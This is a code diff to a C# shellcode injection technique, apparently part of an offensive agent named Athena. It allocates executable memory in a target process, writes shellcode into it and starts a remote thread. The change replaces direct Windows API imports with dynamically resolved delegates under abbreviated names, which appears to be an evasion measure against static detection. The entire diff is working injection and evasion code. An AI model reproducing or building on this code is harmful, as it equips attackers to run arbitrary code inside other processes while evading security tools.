@@ -1,4 +1,5 @@
-﻿using shellcode_inject;
+﻿using Athena.Commands;
+using shellcode_inject;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -13,17 +14,19 @@ namespace shellcode_inject.Techniques
         {
 
         }
-
+        DynamicHandler.DynamicVirtAllocEx dlgVrtAllcEx = (DynamicHandler.DynamicVirtAllocEx) DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.VirtAllcEx, typeof(DynamicHandler.DynamicVirtAllocEx));
+        DynamicHandler.DynamicWriteProcMeme dlgWriteProcMem = (DynamicHandler.DynamicWriteProcMeme)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.WriteProcMem, typeof(DynamicHandler.DynamicWriteProcMeme));
+        DynamicHandler.DynamicCreatRemThread dlgCRT = (DynamicHandler.DynamicCreatRemThread)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CrtRtThrd, typeof(DynamicHandler.DynamicCreatRemThread));
         public bool Inject(byte[] shellcode, IntPtr hTarget)
         {
             // allocate some memory for our shellcode
-            IntPtr pAddr = Native.VirtualAllocEx(hTarget, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE);
+            IntPtr pAddr = dlgVrtAllcEx(hTarget, IntPtr.Zero, (UInt32)shellcode.Length, DynamicHandler.AllocationType.Commit | DynamicHandler.AllocationType.Reserve, DynamicHandler.MemoryProtection.PAGE_EXECUTE_READWRITE);
 
             // write the shellcode into the allocated memory
-            Native.WriteProcessMemory(hTarget, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);
+            dlgWriteProcMem(hTarget, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);
 
             // create the remote thread
-            IntPtr hThread = Native.CreateRemoteThread(hTarget, IntPtr.Zero, 0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, out hThread);
+            IntPtr hThread = dlgCRT(hTarget, IntPtr.Zero, 0, pAddr, IntPtr.Zero, DynamicHandler.ThreadCreationFlags.NORMAL, out hThread);
 
             if (hThread == IntPtr.Zero) { return false; }
 
